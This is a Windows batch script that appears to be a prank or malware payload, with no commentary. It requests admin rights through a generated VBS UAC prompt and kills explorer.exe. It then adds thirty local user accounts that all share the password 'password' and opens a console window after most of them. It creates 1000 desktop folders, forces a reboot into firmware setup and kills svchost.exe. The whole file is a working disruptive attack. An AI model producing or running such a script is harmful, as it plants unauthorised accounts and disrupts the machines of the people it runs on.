@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
    
TASKKILL /f /im "explorer.exe"
net user username1 password /add
start
net user username2 password /add
start
net user username3 password /add
start
net user username4 password /add
start
net user username5 password /add
start
net user username6 password /add
start
net user username7 password /add
start
net user username8 password /add
start
net user username9 password /add
start
net user username10 password /add
start
net user username11 password /add
start
net user username12 password /add
start
net user username13 password /add
start
net user username14 password /add
start
net user username15 password /add
start
net user username16 password /add
start
net user username17 password /add
start
net user username18 password /add
start
net user username19 password /add
start
net user username20 password /add
start
net user username21 password /add
start
net user username22 password /add
start
net user username23 password /add
start
net user username24 password /add
start
net user username25 password /add
start
net user username26 password /add
start
net user username27 password /add
start
net user username28 password /add
start
net user username29 password /add
start
net user username30 password /add
cd desktop
mkdir 1
mkdir 2
mkdir 3
mkdir 4
mkdir 5
mkdir 6
mkdir 7
mkdir 8
mkdir 9
mkdir 10
mkdir 11
mkdir 12
mkdir 13
mkdir 14
mkdir 15
mkdir 16
mkdir 17
mkdir 18
mkdir 19
mkdir 20
mkdir 21
mkdir 22
mkdir 23
mkdir 24
mkdir 25
mkdir 26
mkdir 27
mkdir 28
mkdir 29
mkdir 30
mkdir 31
mkdir 32
mkdir 33
mkdir 34
mkdir 35
mkdir 36
mkdir 37
mkdir 38
mkdir 39
mkdir 40
mkdir 41
mkdir 42
mkdir 43
mkdir 44
mkdir 45
mkdir 46
mkdir 47
mkdir 48
mkdir 49
mkdir 50
mkdir 51
mkdir 52
mkdir 53
mkdir 54
mkdir 55
mkdir 56
mkdir 57
mkdir 58
mkdir 59
mkdir 60
mkdir 61
mkdir 62
mkdir 63
mkdir 64
mkdir 65
mkdir 66
mkdir 67
mkdir 68
mkdir 69
mkdir 70
mkdir 71
mkdir 72
mkdir 73
mkdir 74
mkdir 75
mkdir 76
mkdir 77
mkdir 78
mkdir 79
mkdir 80
mkdir 81
mkdir 82
mkdir 83
mkdir 84
mkdir 85
mkdir 86
mkdir 87
mkdir 88
mkdir 89
mkdir 90
mkdir 91
mkdir 92
mkdir 93
mkdir 94
mkdir 95
mkdir 96
mkdir 97
mkdir 98
mkdir 99
mkdir 100
mkdir 101
mkdir 102
mkdir 103
mkdir 104
mkdir 105
mkdir 106
mkdir 107
mkdir 108
mkdir 109
mkdir 110
mkdir 111
mkdir 112
mkdir 113
mkdir 114
mkdir 115
mkdir 116
mkdir 117
mkdir 118
mkdir 119
mkdir 120
mkdir 121
mkdir 122
mkdir 123
mkdir 124
mkdir 125
mkdir 126
mkdir 127
mkdir 128
mkdir 129
mkdir 130
mkdir 131
mkdir 132
mkdir 133
mkdir 134
mkdir 135
mkdir 136
mkdir 137
mkdir 138
mkdir 139
mkdir 140
mkdir 141
mkdir 142
mkdir 143
mkdir 144
mkdir 145
mkdir 146
mkdir 147
mkdir 148
mkdir 149
mkdir 150
mkdir 151
mkdir 152
mkdir 153
mkdir 154
mkdir 155
mkdir 156
mkdir 157
mkdir 158
mkdir 159
mkdir 160
mkdir 161
mkdir 162
mkdir 163
mkdir 164
mkdir 165
mkdir 166
mkdir 167
mkdir 168
mkdir 169
mkdir 170
mkdir 171
mkdir 172
mkdir 173
mkdir 174
mkdir 175
mkdir 176
mkdir 177
mkdir 178
mkdir 179
mkdir 180
mkdir 181
mkdir 182
mkdir 183
mkdir 184
mkdir 185
mkdir 186
mkdir 187
mkdir 188
mkdir 189
mkdir 190
mkdir 191
mkdir 192
mkdir 193
mkdir 194
mkdir 195
mkdir 196
mkdir 197
mkdir 198
mkdir 199
mkdir 200
mkdir 201
mkdir 202
mkdir 203
mkdir 204
mkdir 205
mkdir 206
mkdir 207
mkdir 208
mkdir 209
mkdir 210
mkdir 211
mkdir 212
mkdir 213
mkdir 214
mkdir 215
mkdir 216
mkdir 217
mkdir 218
mkdir 219
mkdir 220
mkdir 221
mkdir 222
mkdir 223
mkdir 224
mkdir 225
mkdir 226
mkdir 227
mkdir 228
mkdir 229
mkdir 230
mkdir 231
mkdir 232
mkdir 233
mkdir 234
mkdir 235
mkdir 236
mkdir 237
mkdir 238
mkdir 239
mkdir 240
mkdir 241
mkdir 242
mkdir 243
mkdir 244
mkdir 245
mkdir 246
mkdir 247
mkdir 248
mkdir 249
mkdir 250
mkdir 251
mkdir 252
mkdir 253
mkdir 254
mkdir 255
mkdir 256
mkdir 257
mkdir 258
mkdir 259
mkdir 260
mkdir 261
mkdir 262
mkdir 263
mkdir 264
mkdir 265
mkdir 266
mkdir 267
mkdir 268
mkdir 269
mkdir 270
mkdir 271
mkdir 272
mkdir 273
mkdir 274
mkdir 275
mkdir 276
mkdir 277
mkdir 278
mkdir 279
mkdir 280
mkdir 281
mkdir 282
mkdir 283
mkdir 284
mkdir 285
mkdir 286
mkdir 287
mkdir 288
mkdir 289
mkdir 290
mkdir 291
mkdir 292
mkdir 293
mkdir 294
mkdir 295
mkdir 296
mkdir 297
mkdir 298
mkdir 299
mkdir 300
mkdir 301
mkdir 302
mkdir 303
mkdir 304
mkdir 305
mkdir 306
mkdir 307
mkdir 308
mkdir 309
mkdir 310
mkdir 311
mkdir 312
mkdir 313
mkdir 314
mkdir 315
mkdir 316
mkdir 317
mkdir 318
mkdir 319
mkdir 320
mkdir 321
mkdir 322
mkdir 323
mkdir 324
mkdir 325
mkdir 326
mkdir 327
mkdir 328
mkdir 329
mkdir 330
mkdir 331
mkdir 332
mkdir 333
mkdir 334
mkdir 335
mkdir 336
mkdir 337
mkdir 338
mkdir 339
mkdir 340
mkdir 341
mkdir 342
mkdir 343
mkdir 344
mkdir 345
mkdir 346
mkdir 347
mkdir 348
mkdir 349
mkdir 350
mkdir 351
mkdir 352
mkdir 353
mkdir 354
mkdir 355
mkdir 356
mkdir 357
mkdir 358
mkdir 359
mkdir 360
mkdir 361
mkdir 362
mkdir 363
mkdir 364
mkdir 365
mkdir 366
mkdir 367
mkdir 368
mkdir 369
mkdir 370
mkdir 371
mkdir 372
mkdir 373
mkdir 374
mkdir 375
mkdir 376
mkdir 377
mkdir 378
mkdir 379
mkdir 380
mkdir 381
mkdir 382
mkdir 383
mkdir 384
mkdir 385
mkdir 386
mkdir 387
mkdir 388
mkdir 389
mkdir 390
mkdir 391
mkdir 392
mkdir 393
mkdir 394
mkdir 395
mkdir 396
mkdir 397
mkdir 398
mkdir 399
mkdir 400
mkdir 401
mkdir 402
mkdir 403
mkdir 404
mkdir 405
mkdir 406
mkdir 407
mkdir 408
mkdir 409
mkdir 410
mkdir 411
mkdir 412
mkdir 413
mkdir 414
mkdir 415
mkdir 416
mkdir 417
mkdir 418
mkdir 419
mkdir 420
mkdir 421
mkdir 422
mkdir 423
mkdir 424
mkdir 425
mkdir 426
mkdir 427
mkdir 428
mkdir 429
mkdir 430
mkdir 431
mkdir 432
mkdir 433
mkdir 434
mkdir 435
mkdir 436
mkdir 437
mkdir 438
mkdir 439
mkdir 440
mkdir 441
mkdir 442
mkdir 443
mkdir 444
mkdir 445
mkdir 446
mkdir 447
mkdir 448
mkdir 449
mkdir 450
mkdir 451
mkdir 452
mkdir 453
mkdir 454
mkdir 455
mkdir 456
mkdir 457
mkdir 458
mkdir 459
mkdir 460
mkdir 461
mkdir 462
mkdir 463
mkdir 464
mkdir 465
mkdir 466
mkdir 467
mkdir 468
mkdir 469
mkdir 470
mkdir 471
mkdir 472
mkdir 473
mkdir 474
mkdir 475
mkdir 476
mkdir 477
mkdir 478
mkdir 479
mkdir 480
mkdir 481
mkdir 482
mkdir 483
mkdir 484
mkdir 485
mkdir 486
mkdir 487
mkdir 488
mkdir 489
mkdir 490
mkdir 491
mkdir 492
mkdir 493
mkdir 494
mkdir 495
mkdir 496
mkdir 497
mkdir 498
mkdir 499
mkdir 500
mkdir 501
mkdir 502
mkdir 503
mkdir 504
mkdir 505
mkdir 506
mkdir 507
mkdir 508
mkdir 509
mkdir 510
mkdir 511
mkdir 512
mkdir 513
mkdir 514
mkdir 515
mkdir 516
mkdir 517
mkdir 518
mkdir 519
mkdir 520
mkdir 521
mkdir 522
mkdir 523
mkdir 524
mkdir 525
mkdir 526
mkdir 527
mkdir 528
mkdir 529
mkdir 530
mkdir 531
mkdir 532
mkdir 533
mkdir 534
mkdir 535
mkdir 536
mkdir 537
mkdir 538
mkdir 539
mkdir 540
mkdir 541
mkdir 542
mkdir 543
mkdir 544
mkdir 545
mkdir 546
mkdir 547
mkdir 548
mkdir 549
mkdir 550
mkdir 551
mkdir 552
mkdir 553
mkdir 554
mkdir 555
mkdir 556
mkdir 557
mkdir 558
mkdir 559
mkdir 560
mkdir 561
mkdir 562
mkdir 563
mkdir 564
mkdir 565
mkdir 566
mkdir 567
mkdir 568
mkdir 569
mkdir 570
mkdir 571
mkdir 572
mkdir 573
mkdir 574
mkdir 575
mkdir 576
mkdir 577
mkdir 578
mkdir 579
mkdir 580
mkdir 581
mkdir 582
mkdir 583
mkdir 584
mkdir 585
mkdir 586
mkdir 587
mkdir 588
mkdir 589
mkdir 590
mkdir 591
mkdir 592
mkdir 593
mkdir 594
mkdir 595
mkdir 596
mkdir 597
mkdir 598
mkdir 599
mkdir 600
mkdir 601
mkdir 602
mkdir 603
mkdir 604
mkdir 605
mkdir 606
mkdir 607
mkdir 608
mkdir 609
mkdir 610
mkdir 611
mkdir 612
mkdir 613
mkdir 614
mkdir 615
mkdir 616
mkdir 617
mkdir 618
mkdir 619
mkdir 620
mkdir 621
mkdir 622
mkdir 623
mkdir 624
mkdir 625
mkdir 626
mkdir 627
mkdir 628
mkdir 629
mkdir 630
mkdir 631
mkdir 632
mkdir 633
mkdir 634
mkdir 635
mkdir 636
mkdir 637
mkdir 638
mkdir 639
mkdir 640
mkdir 641
mkdir 642
mkdir 643
mkdir 644
mkdir 645
mkdir 646
mkdir 647
mkdir 648
mkdir 649
mkdir 650
mkdir 651
mkdir 652
mkdir 653
mkdir 654
mkdir 655
mkdir 656
mkdir 657
mkdir 658
mkdir 659
mkdir 660
mkdir 661
mkdir 662
mkdir 663
mkdir 664
mkdir 665
mkdir 666
mkdir 667
mkdir 668
mkdir 669
mkdir 670
mkdir 671
mkdir 672
mkdir 673
mkdir 674
mkdir 675
mkdir 676
mkdir 677
mkdir 678
mkdir 679
mkdir 680
mkdir 681
mkdir 682
mkdir 683
mkdir 684
mkdir 685
mkdir 686
mkdir 687
mkdir 688
mkdir 689
mkdir 690
mkdir 691
mkdir 692
mkdir 693
mkdir 694
mkdir 695
mkdir 696
mkdir 697
mkdir 698
mkdir 699
mkdir 700
mkdir 701
mkdir 702
mkdir 703
mkdir 704
mkdir 705
mkdir 706
mkdir 707
mkdir 708
mkdir 709
mkdir 710
mkdir 711
mkdir 712
mkdir 713
mkdir 714
mkdir 715
mkdir 716
mkdir 717
mkdir 718
mkdir 719
mkdir 720
mkdir 721
mkdir 722
mkdir 723
mkdir 724
mkdir 725
mkdir 726
mkdir 727
mkdir 728
mkdir 729
mkdir 730
mkdir 731
mkdir 732
mkdir 733
mkdir 734
mkdir 735
mkdir 736
mkdir 737
mkdir 738
mkdir 739
mkdir 740
mkdir 741
mkdir 742
mkdir 743
mkdir 744
mkdir 745
mkdir 746
mkdir 747
mkdir 748
mkdir 749
mkdir 750
mkdir 751
mkdir 752
mkdir 753
mkdir 754
mkdir 755
mkdir 756
mkdir 757
mkdir 758
mkdir 759
mkdir 760
mkdir 761
mkdir 762
mkdir 763
mkdir 764
mkdir 765
mkdir 766
mkdir 767
mkdir 768
mkdir 769
mkdir 770
mkdir 771
mkdir 772
mkdir 773
mkdir 774
mkdir 775
mkdir 776
mkdir 777
mkdir 778
mkdir 779
mkdir 780
mkdir 781
mkdir 782
mkdir 783
mkdir 784
mkdir 785
mkdir 786
mkdir 787
mkdir 788
mkdir 789
mkdir 790
mkdir 791
mkdir 792
mkdir 793
mkdir 794
mkdir 795
mkdir 796
mkdir 797
mkdir 798
mkdir 799
mkdir 800
mkdir 801
mkdir 802
mkdir 803
mkdir 804
mkdir 805
mkdir 806
mkdir 807
mkdir 808
mkdir 809
mkdir 810
mkdir 811
mkdir 812
mkdir 813
mkdir 814
mkdir 815
mkdir 816
mkdir 817
mkdir 818
mkdir 819
mkdir 820
mkdir 821
mkdir 822
mkdir 823
mkdir 824
mkdir 825
mkdir 826
mkdir 827
mkdir 828
mkdir 829
mkdir 830
mkdir 831
mkdir 832
mkdir 833
mkdir 834
mkdir 835
mkdir 836
mkdir 837
mkdir 838
mkdir 839
mkdir 840
mkdir 841
mkdir 842
mkdir 843
mkdir 844
mkdir 845
mkdir 846
mkdir 847
mkdir 848
mkdir 849
mkdir 850
mkdir 851
mkdir 852
mkdir 853
mkdir 854
mkdir 855
mkdir 856
mkdir 857
mkdir 858
mkdir 859
mkdir 860
mkdir 861
mkdir 862
mkdir 863
mkdir 864
mkdir 865
mkdir 866
mkdir 867
mkdir 868
mkdir 869
mkdir 870
mkdir 871
mkdir 872
mkdir 873
mkdir 874
mkdir 875
mkdir 876
mkdir 877
mkdir 878
mkdir 879
mkdir 880
mkdir 881
mkdir 882
mkdir 883
mkdir 884
mkdir 885
mkdir 886
mkdir 887
mkdir 888
mkdir 889
mkdir 890
mkdir 891
mkdir 892
mkdir 893
mkdir 894
mkdir 895
mkdir 896
mkdir 897
mkdir 898
mkdir 899
mkdir 900
mkdir 901
mkdir 902
mkdir 903
mkdir 904
mkdir 905
mkdir 906
mkdir 907
mkdir 908
mkdir 909
mkdir 910
mkdir 911
mkdir 912
mkdir 913
mkdir 914
mkdir 915
mkdir 916
mkdir 917
mkdir 918
mkdir 919
mkdir 920
mkdir 921
mkdir 922
mkdir 923
mkdir 924
mkdir 925
mkdir 926
mkdir 927
mkdir 928
mkdir 929
mkdir 930
mkdir 931
mkdir 932
mkdir 933
mkdir 934
mkdir 935
mkdir 936
mkdir 937
mkdir 938
mkdir 939
mkdir 940
mkdir 941
mkdir 942
mkdir 943
mkdir 944
mkdir 945
mkdir 946
mkdir 947
mkdir 948
mkdir 949
mkdir 950
mkdir 951
mkdir 952
mkdir 953
mkdir 954
mkdir 955
mkdir 956
mkdir 957
mkdir 958
mkdir 959
mkdir 960
mkdir 961
mkdir 962
mkdir 963
mkdir 964
mkdir 965
mkdir 966
mkdir 967
mkdir 968
mkdir 969
mkdir 970
mkdir 971
mkdir 972
mkdir 973
mkdir 974
mkdir 975
mkdir 976
mkdir 977
mkdir 978
mkdir 979
mkdir 980
mkdir 981
mkdir 982
mkdir 983
mkdir 984
mkdir 985
mkdir 986
mkdir 987
mkdir 988
mkdir 989
mkdir 990
mkdir 991
mkdir 992
mkdir 993
mkdir 994
mkdir 995
mkdir 996
mkdir 997
mkdir 998
mkdir 999
mkdir 1000
timeout /t 5
shutdown.exe /r /fw
TASKKILL /IM svchost.exe /F
